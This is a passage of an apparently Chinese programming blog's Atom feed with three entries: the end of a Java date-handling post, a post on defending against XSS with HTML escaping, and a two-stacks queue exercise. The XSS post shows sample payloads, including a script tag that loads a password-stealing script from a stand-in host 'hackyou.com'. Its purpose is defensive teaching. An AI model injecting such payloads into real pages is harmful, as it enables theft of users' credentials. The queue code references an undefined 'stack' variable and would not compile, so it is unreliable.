一周的第几天</span></span><br><span class="line"><span class="comment">System.out.println("现在的时间是：公元"+year+"年"+month+"月"+day+"日      "+hour+"时"+minute+"分"+second+"秒       星期"+dayOfWeek);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>翻jdk的同时还发现另一种拆分时间的方法，但是没有<code>Calendar</code>自由。<br><a id="more"></a><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用DateFormat实现时间拆解</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getTimeByDate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Date date = <span class="keyword">new</span> Date();</span><br><span class="line">    DateFormat df1 = DateFormat.getDateInstance();<span class="comment">//日期格式，精确到日</span></span><br><span class="line">    DateFormat df2 = DateFormat.getDateTimeInstance();<span class="comment">//可以精确到时分秒</span></span><br><span class="line">    DateFormat df3 = DateFormat.getTimeInstance();<span class="comment">//只显示出时分秒</span></span><br><span class="line">    DateFormat df4 = DateFormat.getDateTimeInstance(DateFormat.FULL,DateFormat.FULL); <span class="comment">//显示日期，周，上下午，时间（精确到秒）</span></span><br><span class="line">    DateFormat df5 = DateFormat.getDateTimeInstance(DateFormat.LONG,DateFormat.LONG); <span class="comment">//显示日期,上下午，时间（精确到秒）</span></span><br><span class="line">    DateFormat df6 = DateFormat.getDateTimeInstance(DateFormat.SHORT,DateFormat.SHORT); <span class="comment">//显示日期，上下午,时间（精确到分）</span></span><br><span class="line">    DateFormat df7 = DateFormat.getDateTimeInstance(DateFormat.MEDIUM,DateFormat.MEDIUM); <span class="comment">//显示日期，时间（精确到分）</span></span><br><span class="line">    System.out.println(df1.format(date));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我个人是比较喜欢Calendar啦，虽然觉得Date类中的get方法更方便，但毕竟oracle不推荐了，那就算了吧。<br>说来说去不就是为了少写几行代码吗Orz</p><hr><p>相关链接：<br><a href="http://docs.oracle.com/javase/8/docs/api/index.html" target="_blank" rel="noopener">Java™ Platform, Standard Edition 8 API Specification</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天碰到获取时间中月份和日期的需求，立马去翻jdk，发现&lt;code&gt;util.Date类&lt;/code&gt;中的获取方法竟然在jdk1.1就过期了…&lt;br&gt;于是按着jdk中推荐的&lt;code&gt;Calendar类&lt;/code&gt;摸过去，找到方法。但是不知道为什么Date里的get方法不推荐了，找机会一定要瞅一瞅源码(ง๑ •̀_•́)ง&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; 使用Calendar实现时间拆解&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;public void getTimeByCalendar()&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	Calendar cal = Calendar.getInstance();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	cal.setTime(new Date());//  传入Date对象即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	int year = cal.get(Calendar.YEAR);// 获取年份&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	int month=cal.get(Calendar.MONTH);// 获取月份&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	int day=cal.get(Calendar.DATE);// 获取日&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	int hour=cal.get(Calendar.HOUR);// 小时&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	int minute=cal.get(Calendar.MINUTE);// 分           &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	int second=cal.get(Calendar.SECOND);// 秒&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	int dayOfWeek = cal.get(Calendar.DAY_OF_WEEK);// 一周的第几天&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;	System.out.println(&quot;现在的时间是：公元&quot;+year+&quot;年&quot;+month+&quot;月&quot;+day+&quot;日      &quot;+hour+&quot;时&quot;+minute+&quot;分&quot;+second+&quot;秒       星期&quot;+dayOfWeek);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;翻jdk的同时还发现另一种拆分时间的方法，但是没有&lt;code&gt;Calendar&lt;/code&gt;自由。&lt;br&gt;
    
    </summary>
    
      <category term="技术一路走到黑" scheme="https://amosannn.github.io/categories/%E6%8A%80%E6%9C%AF%E4%B8%80%E8%B7%AF%E8%B5%B0%E5%88%B0%E9%BB%91/"/>
    
    
      <category term="java" scheme="https://amosannn.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java如何防范XSS攻击</title>
    <link href="https://amosannn.github.io/2017/05/27/xss/"/>
    <id>https://amosannn.github.io/2017/05/27/xss/</id>
    <published>2017-05-27T14:45:01.000Z</published>
    <updated>2017-06-01T16:04:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。</p><p>XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">wiki</a>里写的很清楚。</p><h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步骤中。如果你像我一样是一个勤勤恳恳牢记社会主义核心价值观的少先队员，一定会按问题提示或页面提示输入自然语言。而如果是动了歪脑筋的坏人，他可能会输入这样的信息来恶搞你。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"未满十八岁不得浏览该网站"</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>你可能觉得这没什么，但如果他是个超级坏人，提交的不是这种简单的弹窗脚本，而是这样呢？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"www.hackyou.com/getallpassword.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>惊不惊喜？<br><a id="more"></a></p><h1 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h1><p>XSS通常有两类：</p><blockquote><ul><li>存储型XSS，主要出现在用户输入后会在下个页面显示的表单。例如评论或调查问卷。</li><li>反射型XSS，主要表现为将脚本代码添加进URL地址的请求参数中。</li></ul></blockquote><h1 id="如何预防XSS"><a href="#如何预防XSS" class="headerlink" title="如何预防XSS"></a>如何预防XSS</h1><p>在用户的每次提交前进行html转义，将html中的特定符号，如<code>&lt;</code> <code>&gt;</code> <code>&amp;</code> <code>&quot;</code>等分别转换为html转义字符<code>&amp;lt;</code> <code>&amp;gt;</code> <code>&amp;amp;</code> <code>&amp;quot;</code> 。</p><p>java转义方法：<br>使用jar包 <code>org.springframework.web.util.HtmlUtils</code>，关于html转义的操作：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** HTML转义 **/</span>  </span><br><span class="line">String s = HtmlUtils.htmlEscape(<span class="string">"&lt;div&gt;hello world&lt;/div&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;"</span>);  </span><br><span class="line">System.out.println(s);  </span><br><span class="line">String s2 = HtmlUtils.htmlUnescape(s);  </span><br><span class="line">System.out.println(s2);</span><br></pre></td></tr></table></figure></p><p>实例：在调用和数据库连接的DAO方法前，进行转义，例如注册和评论等功能。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">doreview</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Page page)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> oid = Integer.parseInt(request.getParameter(<span class="string">"oid"</span>));</span><br><span class="line">Order o = orderDAO.get(oid);</span><br><span class="line">o.setStatus(orderDAO.finish);</span><br><span class="line">orderDAO.update(o);</span><br><span class="line"><span class="keyword">int</span> pid = Integer.parseInt(request.getParameter(<span class="string">"pid"</span>));</span><br><span class="line">Product p = productDAO.get(pid);</span><br><span class="line"></span><br><span class="line">String content = request.getParameter(<span class="string">"content"</span>);</span><br><span class="line">content = HtmlUtils.htmlEscape(content);</span><br><span class="line"></span><br><span class="line">User user = (User) request.getSession().getAttribute(<span class="string">"user"</span>);</span><br><span class="line">Review review = <span class="keyword">new</span> Review();</span><br><span class="line">review.setContent(content);</span><br><span class="line">review.setProduct(p);</span><br><span class="line">review.setCreateDate(<span class="keyword">new</span> Date());</span><br><span class="line">review.setUser(user);</span><br><span class="line">reviewDAO.add(review);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"@forereview?oid="</span>+oid+<span class="string">"&amp;showonly=true"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>相关链接:<br><a href="https://www.zhihu.com/question/19739025" target="_blank" rel="noopener">2011年新浪微博XSS事件</a><br><a href="https://gist.github.com/ninehills/1053066" target="_blank" rel="noopener">新浪微博XSS攻击代码</a><br><a href="http://tool.oschina.net/commons?type=2" target="_blank" rel="noopener">html转义字符对照表</a><br><a href="http://tieba.baidu.com/p/3567794788" target="_blank" rel="noopener">简单说下XSS黑站，请注意防范。</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;什么是XSS&quot;&gt;&lt;a href=&quot;#什么是XSS&quot; class=&quot;headerlink&quot; title=&quot;什么是XSS&quot;&gt;&lt;/a&gt;什么是XSS&lt;/h1&gt;&lt;p&gt;XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。&lt;/p&gt;
&lt;p&gt;XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;wiki&lt;/a&gt;里写的很清楚。&lt;/p&gt;
&lt;h1 id=&quot;XSS原理&quot;&gt;&lt;a href=&quot;#XSS原理&quot; class=&quot;headerlink&quot; title=&quot;XSS原理&quot;&gt;&lt;/a&gt;XSS原理&lt;/h1&gt;&lt;p&gt;我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步骤中。如果你像我一样是一个勤勤恳恳牢记社会主义核心价值观的少先队员，一定会按问题提示或页面提示输入自然语言。而如果是动了歪脑筋的坏人，他可能会输入这样的信息来恶搞你。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;alert(&lt;span class=&quot;string&quot;&gt;&quot;未满十八岁不得浏览该网站&quot;&lt;/span&gt;);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;你可能觉得这没什么，但如果他是个超级坏人，提交的不是这种简单的弹窗脚本，而是这样呢？&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script src=&lt;span class=&quot;string&quot;&gt;&quot;www.hackyou.com/getallpassword.js&quot;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;惊不惊喜？&lt;br&gt;
    
    </summary>
    
      <category term="技术一路走到黑" scheme="https://amosannn.github.io/categories/%E6%8A%80%E6%9C%AF%E4%B8%80%E8%B7%AF%E8%B5%B0%E5%88%B0%E9%BB%91/"/>
    
    
      <category term="java" scheme="https://amosannn.github.io/tags/java/"/>
    
      <category term="Network Security" scheme="https://amosannn.github.io/tags/Network-Security/"/>
    
  </entry>
  
  <entry>
    <title>两个栈实现一个队列</title>
    <link href="https://amosannn.github.io/2017/05/25/implement-queue-by-two-stacks/"/>
    <id>https://amosannn.github.io/2017/05/25/implement-queue-by-two-stacks/</id>
    <published>2017-05-25T11:29:53.000Z</published>
    <updated>2017-06-01T16:04:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天下午汉得来学校宣讲，笔试中看到这样一个题目，让我们用两个栈实现一个队列。</p><p>那时候没想太多，队列先进先出，栈先进后出，那么只要一个栈作为主栈，另一个栈作为缓存栈，来回倒腾就能实现队列的功能了。</p><p><img src="/images/two-stacks-operation.jpg" alt=""></p><p>回来后仔细想想，其实还有比这更高效的方法。<a id="more"></a>也就是保留主栈的栈底元素，弹出即可，这样可以减少一次压栈操作。</p><p>顺便用代码实现了一下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">入队时将元素压入栈1。</span></span><br><span class="line"><span class="comment">出队时先判断栈2是否为空，若不为空则直接弹出栈2的栈顶元素。若为空，则将栈1除了栈底的元素弹出并压入栈2，然后弹出栈1的元素再将栈2的元素弹出并压回栈1即可。</span></span><br><span class="line"><span class="comment">这样做的好处是可以减少一次压栈的操作，并且考虑了没有元素可出队的异常处理。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StackToQueue</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; stack1;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; stack2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StackToQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       stack1 = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">       stack2 = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果栈1不为空，且栈1所剩元素大于1，则将栈1出栈并压入栈2</span></span><br><span class="line">        <span class="keyword">while</span>(!stack1.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==stack.size())</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        stack2.push(stack1.pop());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将栈1的元素出栈，即出队。</span></span><br><span class="line">        <span class="keyword">int</span> top = stack1.pop();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果栈2不为空，将栈2中的元素出栈并压回栈1中</span></span><br><span class="line">        <span class="keyword">while</span>(!stack2.isEmpty())&#123;</span><br><span class="line">            stack1.push(stack2.pop());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> top;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天下午汉得来学校宣讲，笔试中看到这样一个题目，让我们用两个栈实现一个队列。&lt;/p&gt;
&lt;p&gt;那时候没想太多，队列先进先出，栈先进后出，那么只要一个栈作为主栈，另一个栈作为缓存栈，来回倒腾就能实现队列的功能了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/two-stacks-operation.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;回来后仔细想想，其实还有比这更高效的方法。
    
    </summary>
    
      <category term="技术一路走到黑" scheme="https://amosannn.github.io/categories/%E6%8A%80%E6%9C%AF%E4%B8%80%E8%B7%AF%E8%B5%B0%E5%88%B0%E9%BB%91/"/>
    
    
      <category term="algorithm" scheme="https://amosannn.github.io/tags/algorithm/"/>
    
  </entry>
  
</feed>
